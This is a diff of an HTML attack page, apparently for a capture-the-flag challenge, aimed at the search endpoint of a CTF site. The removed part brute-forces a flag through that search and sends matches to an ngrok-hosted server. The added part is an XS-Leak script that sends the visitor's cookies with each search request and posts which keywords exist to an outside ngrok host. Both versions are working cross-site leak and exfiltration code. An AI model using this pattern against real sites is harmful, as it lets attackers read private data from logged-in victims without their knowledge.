@@ -3,76 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Brute Force Flag</title>
+    <title>XS-Leak Example</title>
     <script>
-        const myFlaskServer = 'https://d2f2-87-4-142-72.ngrok-free.app'; // Inserisci il tuo URL ngrok qui
-
-        async function search(flag) {
+        async function logResult(keyword, status) {
             try {
-                const response = await fetch(`https://matrix.capturetheflags.site/search?s=${flag}`, {
-                    method: 'GET'
-                });
-
-                if (response.ok) {
-                    const text = await response.text();
-                    console.log('Risultato della ricerca:', text);
-                    // Controlla qui se la risposta indica che hai trovato la flag
-                    if (text.includes('Risultato atteso')) { // Modifica questa condizione in base alla risposta attesa
-                        // Se hai trovato la flag, inviala al tuo server Flask
-                        await sendFlagToServer(flag);
-                    }
-                } else {
-                    console.error('Errore nella richiesta:', response.status);
-                }
-            } catch (error) {
-                console.error('Errore nella richiesta:', error);
-            }
-        }
-
-        async function sendFlagToServer(flag) {
-            try {
-                const response = await fetch(`${myFlaskServer}/submit_flag`, {
+                await fetch('http://e206-87-4-142-72.ngrok-free.app/log', {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json',
+                        'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ flag: flag })
+                    body: JSON.stringify({ keyword, status })
                 });
-
-                if (response.ok) {
-                    console.log('Flag inviata con successo:', flag);
-                } else {
-                    console.error('Errore nell\'invio della flag:', response.status);
-                }
             } catch (error) {
-                console.error('Errore nell\'invio della flag:', error);
+                console.error('Error logging result:', error);
             }
         }
 
-        async function bruteForceFlag() {
-            const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}!@#$%^&*()-_=+[];:,.<>?'; // Include caratteri speciali
-            const flagPrefix = 'flag{'; // Inizia con flag{
-            const flagLength = 32; // Lunghezza della flag attesa
-            let flag = flagPrefix;
+        async function checkKeywords() {
+            const keywords = ['secret', 'groceries', 'meeting', 'project', 'holiday'];
 
-            for (let i = 0; i < flagLength - flagPrefix.length - 1; i++) {
-                for (const char of charset) {
-                    const testFlag = flag + char;
-                    await search(testFlag);
-                    // Aggiungi una pausa tra le richieste per non sovraccaricare il server
-                    await new Promise(r => setTimeout(r, 100)); // 100 ms
+            for (const keyword of keywords) {
+                try {
+                    const response = await fetch(`http://matrix.capturetheflags.site/search?s=${encodeURIComponent(keyword)}`, {
+                        method: 'GET',
+                        credentials: 'include' // Include cookies for session management
+                    });
+
+                    if (response.status === 200) {
+                        console.log(`Keyword found: ${keyword}`);
+                        await logResult(keyword, 'found');
+                    } else if (response.status === 404) {
+                        console.log(`Keyword not found: ${keyword}`);
+                        await logResult(keyword, 'not found');
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
                 }
-                // A questo punto, dovresti controllare la risposta per vedere se hai trovato la flag
             }
         }
-
-        window.onload = function() {
-            bruteForceFlag();
-        };
     </script>
 </head>
 <body>
-    <h1>Brute Force Flag</h1>
-    <p>Controlla la console per vedere i risultati.</p>
+    <h1>XS-Leak Keyword Checker</h1>
+    <button onclick="checkKeywords()">Check Keywords</button>
 </body>
 </html>
